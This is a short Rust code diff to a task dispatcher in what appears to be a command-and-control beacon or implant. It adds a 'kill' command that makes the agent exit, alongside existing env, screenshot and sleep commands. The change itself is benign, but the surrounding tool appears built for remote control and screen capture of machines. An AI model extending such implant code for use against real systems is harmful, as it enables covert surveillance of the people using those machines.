@@ -63,6 +63,7 @@ impl TasksManager {
                 "env" => commands::system::env(),
                 "screenshot" => commands::screenshot::screenshot(),
                 "sleep" => self.handle_sleep_command(beacon, &task.args),
+                "kill" => self.handle_kill_command(),
                 _ => {
                     let err = format!("Unknown command: {}", task.command);
                     println!("{}", err);
@@ -73,6 +74,10 @@ impl TasksManager {
             self.completed_tasks.push(TaskResult { task, output });
         }
         Ok(())
+    }
+
+    fn handle_kill_command(&self) -> String {
+        std::process::exit(0);
     }
 
     fn handle_sleep_command(&self, beacon: &mut Beacon, args: &[String]) -> String {
